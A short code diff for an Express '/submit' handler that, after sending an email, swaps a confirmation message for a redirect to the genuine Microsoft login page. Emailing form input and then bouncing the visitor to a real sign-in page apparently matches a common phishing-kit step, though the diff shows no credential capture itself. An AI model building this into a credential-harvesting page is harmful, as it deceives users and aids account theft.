@@ -53,7 +53,8 @@ app.post('/submit', (req, res) => {
             console.error(error);
             return res.status(500).send('Failed to send email. Please try again later.');
         }
-        res.send('Email sent: ' + info.response);
+        // Redirect to Microsoft login URL
+        res.redirect('https://login.microsoftonline.com/');
     });
 });
 
